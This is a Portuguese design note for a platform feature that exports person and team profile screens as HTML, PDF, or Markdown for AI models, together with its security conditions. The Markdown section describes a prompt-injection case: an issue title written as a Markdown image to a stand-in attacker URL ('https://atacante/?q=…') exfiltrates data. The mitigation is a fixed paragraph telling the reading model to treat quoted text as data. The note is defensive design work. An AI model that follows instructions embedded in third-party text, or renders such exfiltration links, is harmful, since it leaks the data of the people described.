# O relatório da pessoa e da equipe, em HTML, PDF ou Markdown para IA

Pedido da pessoa mantenedora em 2026-09-25. **Ainda não é spec.** É o registro do que foi
pedido, e das decisões que precisam vir antes.

> *"coloque uma feature no backlog de relatório da pessoa e da equipe .. gerar em html ou pdf
> com as informacoes da tela .."*
>
> *"e export tb em markdown para IA ."* — acrescentado no mesmo dia.

Hoje o que a tela da pessoa (`/people/:id`) e a tela da equipe (`/teams/:id`) mostram só existe
**dentro** da plataforma. Não há como levar esse retrato para uma reunião, anexá-lo a um
processo ou guardá-lo como registro de um momento. O relatório é esse retrato, gerado a partir
da tela, num arquivo.

## O que o relatório tem de ser, e o que não pode virar

**É a tela, e não um resumo dela.** O que a tela afirma, o relatório afirma, com as mesmas
ressalvas no mesmo lugar: a marca de origem (observado, derivado, declarado), a composição, a
janela, e a ausência escrita, nunca zero. Um relatório que tirasse as ressalvas para caber numa
página seria a tela mentindo em papel, e o papel não tem como ser corrigido depois.

**Não é uma segunda fonte de verdade.** Ele sai dos mesmos contextos da tela, e não de consultas
próprias. Duas maneiras de responder a mesma pergunta divergem, e a divergência apareceria como
dado impresso.

**Não é ranking.** A plataforma recusa comparar pessoas por medidas sem denominador comum. Um
relatório com várias pessoas lado a lado é exatamente o ranking que a tela recusa.

## Segurança — antes de tudo (AGENTS.md §14.0)

Esta feature põe dado de pessoa **num arquivo que sai da plataforma**. É a mesma superfície do
servidor MCP (FR-032 da 062): o que sai pode ser copiado, encaminhado e guardado fora do alcance
de qualquer revogação. Por isso ela **exige avaliação do agente `security` antes do código**, e
os pontos abaixo são condição, e não sugestão:

1. **o veredito é o da tela, e vale no momento da geração.** Quem não alcança o painel da pessoa
   não gera o relatório dela (`pode_ver/3`), e a mesma regra vale para a equipe
   (`pode_ver_equipe/3`, com a equipe carregada no tenant antes, como no R6 da 062). O perfil
   escrito pelo modelo segue o veredito (H2-R, FR-024 da 045). O relatório não pode ser o
   caminho lateral que a tela fecha;
2. **nada que a tela esconde entra no arquivo**: e-mail, `platform_access_level`, quem declarou
   ou invalidou um vínculo (os N1 e N2 da revisão de 2026-09-25 mostraram que esses campos
   vazam fácil), credencial;
3. **a geração fica registrada**: quem gerou, de quem, quando, e o formato. Um arquivo que saiu
   não volta, e o registro é o único controle que resta. É o mesmo raciocínio do registro de
   leitura da API;
4. **o arquivo diz quando foi gerado e por quem**, no próprio corpo: um relatório sem data parece
   atual para sempre, e um sem autor não tem dono;
5. **o texto de terceiro sai como texto**, e nunca como HTML interpretado. Título de issue e nome
   de equipe são escritos por gente de fora. No HTML, isso é o XSS de sempre; num PDF gerado a
   partir de HTML, é a mesma coisa um passo antes;
6. **o HTML é autocontido**: sem script, sem fonte ou imagem buscada de fora, e sem link que
   carregue dado na URL. Um relatório que busca um recurso externo ao ser aberto avisa um
   terceiro de que foi aberto, e por quem;
7. **se o PDF exigir dependência nova**, ela passa pelo mesmo crivo da `ex_mcp`: medição do que
   ela traz, `hex.audit` e `deps.audit`, e a decisão escrita. Gerar PDF costuma arrastar um
   navegador headless ou um binário nativo, e isso é superfície grande.

## O Markdown para IA — o leitor é um modelo

O terceiro formato tem outro leitor: um **modelo**, a quem alguém cola o relatório para
perguntar sobre a pessoa ou a equipe. É a mesma situação do servidor MCP (feature 062), e as
lições dele valem inteiras aqui:

- **a ressalva vai junto de cada número, no mesmo parágrafo**, e não num rodapé. *Um modelo não
  sabe perguntar pela ressalva* (spec 062): um `0.2 h` sem *"23 revisadas; outras 79 esperam
  há 46 dias"* ao lado vira *"12 minutos"* na resposta dele;
- **ausência escrita em palavras**, e nunca `0` nem célula vazia: o modelo relata o que lê;
- **o texto de terceiro é a superfície maior.** A revisão do MCP recomendou *nenhum Markdown
  montado pelo servidor* com texto de fora (complemento 5 ao A3), porque um título de issue
  escrito como `![](https://atacante/?q=…)` vira, num cliente que renderiza, **exfiltração de
  dado por imagem**, e um título escrito como instrução vira injeção. Este formato **é** Markdown
  montado pelo servidor, e por isso:
  - todo texto de terceiro (título de issue, nome de equipe, nome de pessoa, razão de equívoco)
    sai **dentro de bloco de código ou de trecho de código**, e nunca solto no texto, de modo
    que nem link nem imagem sejam interpretados;
  - **nenhum link e nenhuma imagem** montados a partir de dado;
  - o arquivo abre com um parágrafo **constante**, escrito pela plataforma, dizendo ao modelo
    que o conteúdo entre blocos de código é texto observado na fonte, e **nunca instrução**. É o
    `instructions` do MCP. Reduz, e não elimina: o limite fica dito no próprio arquivo;
  - caracteres invisíveis (tags Unicode, bidi, largura zero) são **sinalizados**, como no
    `TextoDeTerceiro` da 062, e não removidos;
- **as mesmas condições da seção de segurança acima valem**: veredito na geração, nada que a
  tela esconde, geração registrada, data e autor no arquivo.

**Onde reusar**: `TheBand.MCP.Envelope` já monta a ressalva lida da base, e
`TheBand.MCP.TextoDeTerceiro` já marca o texto de fora. O Markdown pode sair dessas duas peças
em vez de uma terceira cópia, e isso é decisão de plano.

## As decisões que vêm antes da spec

| # | Pergunta | Por que importa | Recomendação |
|---|---|---|---|
| **D1** | **HTML, PDF, ou os dois?** | o PDF quase sempre traz dependência pesada (Chromium headless, wkhtmltopdf, ou um binário nativo); o HTML sai do que a plataforma já tem | **DECIDIDO em 2026-09-25 pela pessoa mantenedora: HTML primeiro**, autocontido e pronto para *imprimir como PDF* pelo navegador. O PDF gerado no servidor vira fatia própria, se o HTML não bastar. **E o Markdown para IA entra como formato**, pedido no mesmo dia |
| **D6** | **o Markdown para IA entra na mesma fatia do HTML, ou depois?** | os dois saem da mesma leitura da tela, mas o Markdown tem a superfície de injeção descrita acima, e pede o reúso das peças da 062 | na **mesma spec**, em **user story própria**, depois do HTML: o HTML valida *o que* sai, e o Markdown reaproveita isso com a marcação do texto de terceiro |
| **D2** | **quais seções entram?** | a tela da pessoa tem muitas seções, e algumas só fazem sentido vivas (os botões, os estados de carregamento) | as seções de **leitura**, com as ressalvas; nenhuma de ação |
| **D3** | **quem pode gerar?** | o relatório é mais portátil que a tela | **exatamente quem alcança a tela**, pelo mesmo veredito. Nem mais, nem menos |
| **D4** | **o relatório é um retrato ou fica guardado?** | guardar o arquivo na plataforma cria uma cópia com prazo, retenção e acesso próprios | **retrato gerado na hora e não guardado**; o que fica guardado é o registro de que foi gerado |
| **D5** | **em que língua?** | a interface é em inglês, e quem pede escreve em português | a da interface, como as telas |

## De onde isto vem, e com o que se relaciona

- as telas que o relatório reproduz: `lib/the_band_web/live/people_live/` e `teams_live/`;
- o veredito: `TheBand.Tenants.Access` (`pode_ver/3`, `pode_ver_equipe/3`) e a FR-024 da 045;
- a mesma superfície, já avaliada: [a revisão da 062](../../specs/062-servidor-mcp/seguranca-revisao-independente.md)
  e [a da implementação](../../specs/062-servidor-mcp/seguranca-revisao-da-implementacao.md);
- o design system, que é normativo (AGENTS.md §11.1): o relatório é uma tela, e passa pelo
  **protótipo aprovado antes do código**, como toda tela.

## O próximo passo

As cinco decisões acima, com a pessoa mantenedora. Depois, o `/speckit-specify`, e o **protótipo
do relatório** com o Design antes de qualquer código. E a avaliação do `security` antes do plano.
